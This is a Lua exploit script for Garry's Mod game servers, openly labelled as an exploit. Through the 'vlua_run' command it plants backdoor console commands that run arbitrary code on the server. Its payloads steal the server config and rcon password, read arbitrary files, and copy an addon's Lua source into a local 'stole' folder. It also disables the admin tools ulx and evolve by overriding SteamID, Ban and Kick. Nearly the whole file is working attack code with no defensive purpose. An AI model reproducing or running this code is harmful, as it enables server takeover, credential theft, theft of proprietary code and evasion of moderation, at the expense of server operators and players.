print("Exploit script by C0BRA")

local CMDAdd = "sv_add1"
local CMDRun = "sv_run1"

local PAYLOAD1 = [[
concommand.Remove("]] .. CMDAdd .. [[")
concommand.Add("]] .. CMDAdd .. [[", function(p,c,a)
	local new = ""
	for k,v in pairs(a) do new = new .. v end
	p._TR=(p._TR or "") .. new
end)
]]
local PAYLOAD2 = [[
concommand.Remove("]] .. CMDRun .. [[")
concommand.Add("]] .. CMDRun .. [[", function(p)
	local s,m = pcall(RunString, p._TR)
	p._TR = ""
	p:ChatPrint(s)
	p:ChatPrint(m)
	p:SendLua("Exploited = true")
end)
]]

local RemoteCMD = "vlua_run"
Exploited = false
concommand.Add("exploit", function()
	timer.Simple(0, RunConsoleCommand,RemoteCMD,PAYLOAD1)
	timer.Simple(1, RunConsoleCommand,RemoteCMD,PAYLOAD2)
	timer.Simple(2, RunConsoleCommand,CMDAdd, [[for k,v in pairs(player.GetAll()) do if v:SteamID() == "]] .. LocalPlayer():SteamID() .. [[" then v:ChatPrint("Exploited") end end]])
	timer.Simple(3, RunConsoleCommand,CMDRun)
end)

local sendsize = 200
function RunRemoteLua(lua)
	if not lua then return end
	local len = #lua
	local count = 0
	for i = 1, len, sendsize do
		local thisstr = string.sub(lua, i, i + sendsize - 1)
		timer.Simple(count / 5, RunConsoleCommand,CMDAdd, thisstr)
		count = count + 1
	end
	timer.Simple(count / 5, RunConsoleCommand,CMDRun)
end

concommand.Add("print_server_cfg", function()
	local lua = [[

	]]
	lua = [[
		for k,v in pairs(player.GetAll()) do
			if v:EntIndex() == ]] .. LocalPlayer():EntIndex() .. [[ then
				local contents = file.Read("../cfg/server.cfg")
				local arr = string.Explode("\n", contents)
				for i, line in pairs( arr ) do
					umsg.Start("ads_print", v)
						umsg.String(line)
					umsg.End()
				end
				umsg.Start("ads_print", v)
					umsg.String("rcon = " .. GetConVarString("rcon_password"))
				umsg.End()
			end
		end
	]]
	print(lua)
	RunRemoteLua(lua)
end)

concommand.Add("print_file", function(p,c,a)
	local lua = [[

	]]
	lua = [[
		local self = nil
		for k,v in pairs(player.GetAll()) do
			if v:SteamID() == "]] .. LocalPlayer():SteamID() .. [[" then
				self = v
			end
		end
		for k,v in pairs(player.GetAll()) do
			if v:SteamID() == "]] .. LocalPlayer():SteamID() .. [[" then
				local contents = file.Read("../" .. "]] .. a[1] .. [[")
				local arr = string.Explode("\n", contents)
				for i, line in pairs( arr ) do
					umsg.Start("ads_print", self)
						umsg.String(line)
					umsg.End()
				end
			end
		end
	]]
	print(lua)
	RunRemoteLua(lua)
end)

concommand.Add("dump_remote_lua2", function(p,c,a)
	local lua = [[
		local self = nil
		for k,v in pairs(player.GetAll()) do
			if v:SteamID() == "]] .. LocalPlayer():SteamID() .. [[" then
				self = v
			end
		end
		
		local DownloadQueue = {}
		
		local function DownloadFile(filec)
			table.insert(DownloadQueue, filec)
		end
		
		local function DownloadFileReal(filec)
			local contents = file.Read("../" .. filec)
			local arr = string.Explode("\n", contents)
			for i, line in pairs( arr ) do
				umsg.Start("ads_append", self)
					umsg.String(filec)
					umsg.String(line)
				umsg.End()
			end
		end
		
		local function StartDownload()
			self:ChatPrint("Sending " .. tostring(#DownloadQueue) .. " files")
			for k,v in pairs(DownloadQueue) do
				//timer.Simple(k * 5, DownloadFileReal, filec)
			end
		end
		
		local function DownloadDirFiles(dir)
			local list = file.FindDir("../"..dir.."/*")
			for _, fdir in pairs(list) do
				if fdir != ".svn" then
					DownloadDirFiles(dir.."/"..fdir)
				end
			end
		 
			for k,v in pairs(file.Find("../"..dir.."/*")) do
				if string.Right(v, 4) == ".lua" then
					DownloadFile(dir.."/"..v)
				end
			end
		end
		self:ChatPrint("Starting dump!")
		DownloadDirFiles("addons/SpaceAge/")
		StartDownload()
	]]
	print(lua)
	RunRemoteLua(lua)
end)

concommand.Add("print_file_listing_load", function()
	
	local lua = [[
	local self = nil
	for k,v in pairs(player.GetAll()) do
		if v:SteamID() == "]] .. LocalPlayer():SteamID() .. [[" then
			self = v
		end
	end
	local function PrintDirFiles(dir)
		local list = file.FindDir("../"..dir.."/*")
		for _, fdir in pairs(list) do
			if fdir != ".svn" then
				PrintDirFiles(dir.."/"..fdir)
			end
		end
	 
		for k,v in pairs(file.Find("../"..dir.."/*")) do
			if string.Right(v, 4) == ".lua" then
				umsg.Start("ads_print", self)
					umsg.String(dir.."/"..v)
				umsg.End()
			end
		end
	end
	concommand.Add("sv_printdirfiles", function(p,c,a) PrintDirFiles(a[1]) end)
	
	local function PrintDir(dir)
		local list = file.FindDir("../"..dir.."/*")
		for _, fdir in pairs(list) do
			if fdir != ".svn" then
				umsg.Start("ads_print", self)
					umsg.String(dir.."/"..fdir)
				umsg.End()
			end
		end
	end
	concommand.Add("sv_printdir", function(p,c,a) PrintDir(a[1]) end)
	
	
	
	self:ChatPrint("File Printer Loaded.")
	]]
	RunRemoteLua(lua)
end)

usermessage.Hook("ads_print", function(um)
	Msg(um:ReadString() .. "\n")
end)

usermessage.Hook("ads_append", function(um)
	local filename = um:ReadString()
	filex.Append("stole/" .. string.Replace(filename, ".lua", ".txt"), um:ReadString() .. "\n")
	Msg("Got part of file for " .. filename .. "\n")
end)

concommand.Add("fuck", function()
	RunRemoteLua([[
	
	timer.Create(5, 1,0,function()
		for k,v in pairs(player.GetAll()) do

			//v:ConCommand("say The rcon password is \"hellhacker07414\"!")
			//v:Spawn()
		end
	end)
	]])
end)


concommand.Add("fuck_admins", function()
	RunRemoteLua([[
		concommand.Add("ulx", function() end)
		concommand.Add("ev", function() end)
		
		ulx = {}
		evolve = {}

		function _R.Player:SteamID()
			return "STEAM_0:0:0"
		end
		function _R.Player:UniqueID()
			return 0
		end
		function _R.Player:Ban()
			return 0
		end
		function _R.Player:Kick()
			return 0
		end
		function _R.Player:Name()
			return ""
		end
		function _R.Player:Nick()
			return ""
		end
	]])
end)
